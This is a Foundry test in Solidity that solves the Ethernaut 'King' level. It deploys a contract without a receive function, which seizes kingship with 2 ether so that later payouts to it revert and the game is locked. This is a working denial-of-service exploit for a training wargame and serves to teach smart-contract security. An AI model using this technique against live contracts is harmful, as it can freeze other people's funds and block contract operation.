// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/09-King/KingFactory.sol";
import "../src/Ethernaut.sol";

contract KingTransferStuck {
    function stuckTransfer(address _address) external payable returns (bool)  {
        (bool sent, ) = payable(_address).call{value:msg.value}("");
        return sent;
    }
}

contract KingTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 3 ether);
    }

    function testKing() public {
        // Level Setup
        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(kingFactory);
        King ethernautKing = King(payable(levelAddress));

        // Level Attack
        KingTransferStuck attack = new KingTransferStuck();
        bool success = attack.stuckTransfer{value: 2 ether}(levelAddress);
        assertTrue(success);

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
